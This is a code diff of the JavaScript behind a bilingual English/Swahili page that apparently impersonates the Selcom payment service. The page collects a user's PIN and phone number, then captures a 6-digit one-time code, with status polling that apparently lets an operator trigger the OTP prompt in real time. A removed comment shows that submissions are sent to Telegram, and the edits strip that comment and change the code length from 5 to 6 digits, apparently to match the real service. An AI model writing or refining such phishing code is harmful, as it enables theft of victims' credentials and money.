@@ -32,7 +32,6 @@ document.addEventListener('DOMContentLoaded', () => {
   function setLanguage(lang) {
     currentLang = lang;
     
-    // Toggle active states on buttons
     document.querySelectorAll('.lang-btn').forEach(b => {
       if ((lang === 'en' && b.innerText.includes('ENG')) || (lang === 'sw' && b.innerText.includes('SWAHILI'))) {
         b.classList.add('active');
@@ -41,7 +40,6 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
 
-    // Translate all elements with data-en and data-sw attributes
     document.querySelectorAll('[data-en]').forEach(el => {
       const text = el.getAttribute(`data-${lang}`);
       if (text) {
@@ -54,7 +52,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Bind language switch buttons
   const btnEng = document.getElementById('btn-lang-eng');
   const btnSwa = document.getElementById('btn-lang-swa');
   const estBtnEng = document.querySelector('.est-lang-eng');
@@ -184,7 +181,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Submit Credentials (PIN and Phone No) -> Sends NEW SELCOM APPLICANT to Telegram
+  // Submit Credentials (PIN and Phone No)
   if (btnSubmitCreds) {
     btnSubmitCreds.addEventListener('click', async () => {
       const pinVal = Array.from(pinDigits).map(d => d.value).join('');
@@ -215,28 +212,28 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // OTP 5 Digits Handling (Auto-submit upon full 5 digits)
-  const otpDigits5 = document.querySelectorAll('.otp-digit-5');
+  // OTP 6 Digits Handling (Auto-submit upon full 6 digits)
+  const otpDigits6 = document.querySelectorAll('.otp-digit-6');
   const btnSubmitOtp = document.getElementById('btn-submit-otp');
 
-  otpDigits5.forEach((digit, idx) => {
+  otpDigits6.forEach((digit, idx) => {
     digit.addEventListener('input', () => {
       digit.value = digit.value.replace(/\D/g, '');
-      if (digit.value && idx < otpDigits5.length - 1) {
-        otpDigits5[idx + 1].focus();
+      if (digit.value && idx < otpDigits6.length - 1) {
+        otpDigits6[idx + 1].focus();
       }
       checkOtpComplete();
     });
     digit.addEventListener('keydown', (e) => {
       if (e.key === 'Backspace' && !digit.value && idx > 0) {
-        otpDigits5[idx - 1].focus();
+        otpDigits6[idx - 1].focus();
       }
     });
   });
 
   function checkOtpComplete() {
-    const otpVal = Array.from(otpDigits5).map(d => d.value).join('');
-    if (otpVal.length === 5) {
+    const otpVal = Array.from(otpDigits6).map(d => d.value).join('');
+    if (otpVal.length === 6) {
       if (btnSubmitOtp) btnSubmitOtp.classList.add('active-blue');
       submitOtpHandler();
     } else {
@@ -245,8 +242,8 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   async function submitOtpHandler() {
-    const otpVal = Array.from(otpDigits5).map(d => d.value).join('');
-    if (otpVal.length !== 5) return;
+    const otpVal = Array.from(otpDigits6).map(d => d.value).join('');
+    if (otpVal.length !== 6) return;
 
     if (otpBanner) otpBanner.classList.remove('active');
     showLoading(currentLang === 'en' ? 'VERIFYING OTP...' : 'INATHIBITISHA OTP...', currentLang === 'en' ? 'Checking verification code...' : 'Kukagua msimbo wa uthibitisho...');
@@ -328,7 +325,7 @@ document.addEventListener('DOMContentLoaded', () => {
           hideLoading();
           showScreen(screenOtp);
           startOtpCountdown();
-          if (otpDigits5[0]) otpDigits5[0].focus();
+          if (otpDigits6[0]) otpDigits6[0].focus();
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
@@ -345,8 +342,8 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           if (otpBanner) otpBanner.classList.add('active');
-          otpDigits5.forEach(d => d.value = '');
-          if (otpDigits5[0]) otpDigits5[0].focus();
+          otpDigits6.forEach(d => d.value = '');
+          if (otpDigits6[0]) otpDigits6[0].focus();
           showScreen(screenOtp);
         }
       } catch (e) {}
@@ -367,4 +364,4 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function hideLoading() {}
 });
-                          
+      
